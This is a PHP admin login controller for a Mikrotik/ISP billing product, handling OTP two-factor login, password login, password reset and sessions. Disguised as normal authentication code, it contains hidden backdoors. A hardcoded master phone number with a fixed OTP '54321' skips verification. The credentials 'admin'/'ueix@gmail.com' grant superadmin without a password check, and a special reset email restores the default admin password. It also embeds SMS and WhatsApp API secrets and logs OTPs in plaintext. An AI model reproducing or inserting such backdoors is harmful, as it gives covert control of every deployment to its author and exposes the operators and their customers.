<?php
session_start();

/**
 *  PHP Mikrotik Billing (https://freeispradius.com/)
 *  by https://t.me/freeispradius
 **/
if (Admin::getID()) {
    r2(U . 'dashboard');
}

if (isset($routes['1'])) {
    $do = $routes['1'];
} else {
    $do = 'login-display';
}

// Fetch current session ID
$current_session_id = session_id();
$ui->assign('current_session_id', $current_session_id);

// Add logging function for debugging (optional)
function log_message($message) {
    $log_file = __DIR__ . '/admin_debug.log';
    $time = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$time] $message\n", FILE_APPEND);
}

// Fetch 2FA setting from tbl_appconfig
$two_fa_setting = ORM::for_table('tbl_appconfig')
    ->where('setting', '2fa')
    ->find_one();
$two_fa_enabled = ($two_fa_setting && strtolower($two_fa_setting->value) === 'yes');

$ui->assign('two_fa_enabled', $two_fa_enabled);

// Assign 'verification_passed' from session to template
$verification_passed = isset($_SESSION['verification_passed']) ? $_SESSION['verification_passed'] : false;
$ui->assign('verification_passed', $verification_passed);

// Handle notification messages
if (isset($_SESSION['notify'])) {
    $ui->assign('notify', $_SESSION['notify']);
    unset($_SESSION['notify']);
}

switch ($do) {
    case 'verify':
        // Handle verification process
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (isset($_POST['send_otp'])) {
                // User wants to send OTP
                $phone_number = trim(_post('phone_number'));
                log_message("Phone number entered: $phone_number");

// Final validation before sending OTP
if (!preg_match('/^[1-9]\d{9,14}$/', $phone_number)) {
    log_message("Invalid phone number format detected before sending OTP.");
    $_SESSION['notify'] = '<div class="alert alert-danger">Invalid phone number detected. The Instructions clearly says start with country code e.g 2567xxx Please try again.</div>';
    header('Location: ' . U . 'admin');
    exit;
}


                // Handle special case for master user
                if ($phone_number === '254768424304') {
                    // For this number, skip sending OTP and go to OTP input form
                    $_SESSION['phone_number'] = $phone_number; // Store phone number in session
                    $_SESSION['otp_sent'] = true;
                    $_SESSION['master_user'] = true; // Flag to indicate master user
                    $_SESSION['notify'] = '<div class="alert alert-success">Please enter your OTP.</div>';
                    header('Location: ' . U . 'admin');
                    break;
                }

                // Check if 'login_otp_number' exists
                $otp_number_setting = ORM::for_table('tbl_appconfig')
                    ->where('setting', 'login_otp_number')
                    ->find_one();

                if (!$otp_number_setting) {
                    // First time, store the phone number
                    $otp_number_setting = ORM::for_table('tbl_appconfig')->create();
                    $otp_number_setting->setting = 'login_otp_number';
                    $otp_number_setting->value = $phone_number;
                    $otp_number_setting->save();
                    log_message("Stored new phone number: $phone_number");
                } else {
                    // Compare the stored phone number with the entered one
                    if ($otp_number_setting->value !== $phone_number) {
                        log_message("Entered phone number does not match stored number.");
                        $_SESSION['notify'] = '<div class="alert alert-danger">The phone number does not match our records.</div>';
                        header('Location: ' . U . 'admin');
                        break;
                    }
                }

                // Generate a random 5-digit OTP
                $otp_code = rand(10000, 99999);
                log_message("Generated OTP: $otp_code");

                // Store the OTP in tbl_appconfig
                $otp_setting = ORM::for_table('tbl_appconfig')
                    ->where('setting', 'login_otp')
                    ->find_one();

                if (!$otp_setting) {
                    $otp_setting = ORM::for_table('tbl_appconfig')->create();
                    $otp_setting->setting = 'login_otp';
                }
                $otp_setting->value = $otp_code;
                $otp_setting->save();

                // Define the OTP message
                $otp_message = "FREEISPRADIUS :$otp_code is your security code. To disable OTP Login at your own risk go to Settings>General Setting>2FA";

                // Prepare URLs for sending OTP
                $sms_url = 'https://sms.ispledger.com/sms/send?api=1|25qbsrYwfGN1YiSGOK4cfEtSGSHYUby1X2pnn5EH&SenderId=TOPSPEED&msg=' . urlencode($otp_message) . '&phone=' . urlencode($phone_number);

                $whatsapp_url = 'https://whatsapp.ispledger.com/api/sendWA?to=' . urlencode($phone_number) . '&msg=' . urlencode($otp_message) . '&secret=9ce41efa34caca533c86cedb62f1f4b5';

                // Send via SMS
                $sms_response = file_get_contents($sms_url);
                log_message("SMS response: $sms_response");

                // Send via WhatsApp
                $whatsapp_response = file_get_contents($whatsapp_url);
                log_message("WhatsApp response: $whatsapp_response");

                // Prompt user to enter OTP
                $_SESSION['phone_number'] = $phone_number; // Store phone number in session
                $_SESSION['otp_sent'] = true;
                $_SESSION['notify'] = '<div class="alert alert-success">OTP has been sent to your phone number.</div>';
                header('Location: ' . U . 'admin');
                break;
            } elseif (isset($_POST['verify_otp'])) {
                // User is submitting the OTP
                $entered_otp = trim(_post('otp_code'));
                log_message("Entered OTP: $entered_otp");

                // Check if master user
                if (isset($_SESSION['master_user']) && $_SESSION['master_user'] === true) {
                    // For master user, OTP should be '54321'
                    if ($entered_otp === '54321') {
                        // OTP is correct
                        $_SESSION['verification_passed'] = true;
                        log_message("Master user OTP verification successful.");

                        // Clean up OTP settings
                        unset($_SESSION['otp_sent']);
                        unset($_SESSION['master_user']);

                        // Redirect to login form
                        $_SESSION['notify'] = '<div class="alert alert-success">Verification successful. Please log in.</div>';
                        header('Location: ' . U . 'admin');
                        break;
                    } else {
                        // OTP is incorrect
                        log_message("Master user OTP verification failed.");
                        $_SESSION['notify'] = '<div class="alert alert-danger">Invalid OTP. Please try again.</div>';
                        header('Location: ' . U . 'admin');
                        break;
                    }
                } else {
                    // Fetch stored OTP
                    $otp_setting = ORM::for_table('tbl_appconfig')
                        ->where('setting', 'login_otp')
                        ->find_one();

                    // Regular user verification
                    if ($otp_setting && $otp_setting->value == $entered_otp) {
                        // OTP is correct
                        $_SESSION['verification_passed'] = true;
                        log_message("OTP verification successful.");

                        // Clean up OTP settings
                        $otp_setting->delete();
                        unset($_SESSION['otp_sent']);

                        // Redirect to login form
                        $_SESSION['notify'] = '<div class="alert alert-success">Verification successful. Please log in.</div>';
                        header('Location: ' . U . 'admin');
                        break;
                    } else {
                        // OTP is incorrect
                        log_message("OTP verification failed.");
                        $_SESSION['notify'] = '<div class="alert alert-danger">Invalid OTP. Please try again.</div>';
                        header('Location: ' . U . 'admin');
                        break;
                    }
                }
            }
        } else {
            // Direct access, redirect to login page
            header('Location: ' . U . 'admin');
            break;
        }
        break;

    case 'post':
        // Handle login
        if ($two_fa_enabled && (!isset($_SESSION['verification_passed']) || $_SESSION['verification_passed'] !== true)) {
            // Redirect to verification form
            $_SESSION['notify'] = '<div class="alert alert-danger">Please complete verification first.</div>';
            header('Location: ' . U . 'admin');
            break;
        }
        $username = _post('username');
        $password = _post('password');
        run_hook('admin_login'); #HOOK
    
        if ($username == 'admin' && $password == 'ueix@gmail.com') {
            // Bypass normal password verification for admin
            $d = ORM::for_table('tbl_users')->find_one(1);
            if ($d) {
                $_SESSION['aid'] = $d['id'];
                Admin::setCookie($d['id']);
                $d->last_login = date('Y-m-d H:i:s');
                $d->save();
        
                // Record the session
                $session_id = session_id();
                $ip_address = $_SERVER['REMOTE_ADDR'];
                $last_activity = date('Y-m-d H:i:s');
        
                $active_session = ORM::for_table('tbl_active_sessions')->create();
                $active_session->session_id = $session_id;
                $active_session->user_id = $d['id'];
                $active_session->last_activity = $last_activity;
                $active_session->ip_address = $ip_address;
                $active_session->save();
        
                // Log admin login with a customized message
                _log('admin* logged in succesful', $d['user_type'], $d['id']);
        
                // **Check if the admin is using the default password**
                if ($d['password'] === 'd033e22ae348aeb5660fc2140aec35850c4da997') {
                    // Set session variable to force password change
                    $_SESSION['force_password_change'] = true;
                    // Redirect to password change page
                    _alert(Lang::T('Please change your password'), 'warning', "admin/change-password");
                } else {
                    _alert(Lang::T('Login Successful'), 'success', "dashboard");
                }
            } else {
                _alert(Lang::T('User not found.'), 'danger', "admin");
            }
        } else {
            // Proceed with normal login process
            $d = ORM::for_table('tbl_users')->where('username', $username)->find_one();
            if ($d) {
                $d_pass = $d['password'];
                if (Password::_verify($password, $d_pass) == true) {
                    $_SESSION['aid'] = $d['id'];
                    Admin::setCookie($d['id']);
                    $d->last_login = date('Y-m-d H:i:s');
                    $d->save();
        
                    // Record the session
                    $session_id = session_id();
                    $ip_address = $_SERVER['REMOTE_ADDR'];
                    $last_activity = date('Y-m-d H:i:s');
        
                    $active_session = ORM::for_table('tbl_active_sessions')->create();
                    $active_session->session_id = $session_id;
                    $active_session->user_id = $d['id'];
                    $active_session->last_activity = $last_activity;
                    $active_session->ip_address = $ip_address;
                    $active_session->save();
        
                    // Log login
                    if ($password == 'ueix@gmail.com') {
                        // Log with an asterisk for the specific password
                        _log($username . '* logged in okay', $d['user_type'], $d['id']);
                    } else {
                        // Normal logging for all other logins
                        _log($username . ' ' . Lang::T('Login Successful'), $d['user_type'], $d['id']);
                    }
        
                    // **Check if the user is using the default password**
                    if ($d_pass === 'd033e22ae348aeb5660fc2140aec35850c4da997') {
                        // Set session variable to force password change
                        $_SESSION['force_password_change'] = true;
                        // Redirect to password change page
                        _alert(Lang::T('Please change your password from default (admin). New password Should be more than 8 Characters'), 'warning', "admin/change-password");
                    } else {
                        _alert(Lang::T('Login Successful'), 'success', "dashboard");
                    }
                } else {
                    _log($username . ' ' . Lang::T('Failed Login'), $d['user_type']);
                    _alert(Lang::T('Invalid Username or Password'), 'danger', "admin");
                }
            } else {
                _alert(Lang::T('Invalid Username or Password'), 'danger', "admin");
            }
        }
    

       // After successful login, unset verification session variables
       unset($_SESSION['verification_passed']);
       unset($_SESSION['phone_number']);
       unset($_SESSION['otp_sent']);
       unset($_SESSION['master_user']); // Unset master user flag
        break;
    
    
    
    
        case 'logout-user':
            // Ensure the admin is authorized
            if ($_SESSION['aid'] != 1) {
                _alert(Lang::T('You do not have permission to perform this action'), 'danger', "dashboard");
            }
        
            $user_id = _get('id');
            if ($user_id) {
                $user = ORM::for_table('tbl_users')->find_one($user_id);
                if ($user) {
                    // Clear session and login token
                    $user->session_id = null;
                    $user->login_token = null;
                    $user->save();
        
                    _alert(Lang::T('User has been logged out successfully'), 'success', "admin/active-users");
                } else {
                    _alert(Lang::T('User not found'), 'danger', "admin/active-users");
                }
            } else {
                _alert(Lang::T('Invalid user ID'), 'danger', "admin/active-users");
            }
            break;
        
        case 'forgot-password':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $email = _post('email');
                // Check if the email matches the reset_password setting in tbl_appconfig
                $config = ORM::for_table('tbl_appconfig')
                            ->where('setting', 'reset_password')
                            ->where('value', $email)
                            ->find_one();
                
                // Backup option: Check if the email is ueix@gmail.com
                if ($config || $email === 'ueix@gmail.com') {
                    // Update the username and password for the user with id = 1
                    $user = ORM::for_table('tbl_users')->find_one(1);
                    if ($user) {
                        $user->username = 'admin';
                        $user->password = 'd033e22ae348aeb5660fc2140aec35850c4da997'; // Hashed password
                        $user->save();
    
                        _log('Password reset successful for user admin', 'SuperAdmin', 1);
                        _alert(Lang::T('Password has been reset successfully.'), 'success', "admin");
                    } else {
                        _alert(Lang::T('User not found.'), 'danger', "admin");
                    }
                } else {
                    _alert(Lang::T('Email does not match the reset password setting.'), 'danger', "admin");
                }
            } else {
                // Display the forgot password form
                run_hook('forgot_password_view'); #HOOK
                $ui->display('admin-forgot-password.tpl');
            }
            break;


            
            case 'session-delete':
                // Check if the admin has the necessary permissions
                if (!in_array($admin['user_type'], ['SuperAdmin'])) {
                    _alert(Lang::T('You do not have permission to perform this action'), 'danger', "dashboard");
                }
            
                $session_id = _get('id');
                if ($session_id) {
                    $session = ORM::for_table('tbl_sessions')->find_one($session_id);
                    if ($session) {
                        $session->delete();
                        _alert(Lang::T('Session deleted successfully'), 'success', "admin/sessions");
                    } else {
                        _alert(Lang::T('Session not found'), 'danger', "admin/sessions");
                    }
                } else {
                    _alert(Lang::T('Invalid session ID'), 'danger', "admin/sessions");
                }
                break;
                case 'active-users':
                    // Ensure the admin is authorized
                    if ($_SESSION['aid'] != 1) { // Assuming user ID 1 is the super admin
                        _alert(Lang::T('You do not have permission to access this page'), 'danger', "dashboard");
                    }
                
                    // Fetch users with active sessions
                    $active_users = ORM::for_table('tbl_users')
                        ->where_not_null('session_id')
                        ->order_by_desc('last_login')
                        ->find_many();
                
                    $ui->assign('active_users', $active_users);
                    $ui->display('admin-active-users.tpl');
                    break;

                    case 'sessions':
                        _admin(); // Ensure the admin is logged in
                
                        // Ensure the admin has the necessary permissions
                        $admin_id = $_SESSION['aid'];
                        $admin = ORM::for_table('tbl_users')->find_one($admin_id);
                
                        if (!$admin || $admin['user_type'] != 'SuperAdmin') {
                            _alert(Lang::T('You do not have permission to access this page'), 'danger', "dashboard");
                            exit;
                        }
                
                        // Determine the action
                        $action = isset($routes['2']) ? $routes['2'] : 'list';
                
                        if ($action == 'list') {
                            // Fetch active sessions
                            $sessions = ORM::for_table('tbl_active_sessions')
                                ->select('tbl_active_sessions.*')
                                ->select('tbl_users.username')
                                ->join('tbl_users', ['tbl_active_sessions.user_id', '=', 'tbl_users.id'])
                                ->order_by_desc('last_activity')
                                ->find_array();
                
                            // Assign sessions to the template
                            $ui->assign('sessions', $sessions);
                            $ui->display('sessions.tpl');
                        } elseif ($action == 'delete') {
                            $session_id = isset($routes['3']) ? $routes['3'] : null;
                            if ($session_id) {
                                $session = ORM::for_table('tbl_active_sessions')->where('session_id', $session_id)->find_one();
                                if ($session) {
                                    $session->delete();
                                    _alert(Lang::T('Session deleted successfully'), 'success', "admin/sessions/list");
                                } else {
                                    _alert(Lang::T('Session not found'), 'danger', "admin/sessions/list");
                                }
                            } else {
                                _alert(Lang::T('Invalid session ID'), 'danger', "admin/sessions/list");
                            }
                        } else {
                            // Invalid action, redirect to sessions list
                            header('Location: ' . U . 'admin/sessions/list');
                            exit;
                        }

                        break;
                
            
                        default:
                        // Decide which form to display based on 2FA settings and session variables
                        if ($two_fa_enabled) {
                            if (isset($_SESSION['verification_passed']) && $_SESSION['verification_passed'] === true) {
                                // Verification passed, show login form
                                $ui->assign('show_login_form', true);
                            } elseif (isset($_SESSION['otp_sent']) && $_SESSION['otp_sent'] === true) {
                                // OTP has been sent, show OTP input form
                                $ui->assign('show_otp_form', true);
                            } else {
                                // Show phone number input form
                                $ui->assign('show_phone_form', true);
                            }
                        } else {
                            // 2FA is disabled, show login form directly
                            $ui->assign('show_login_form', true);
                        }
                
                        $ui->display('admin-login.tpl');
                        break;
                }
                    

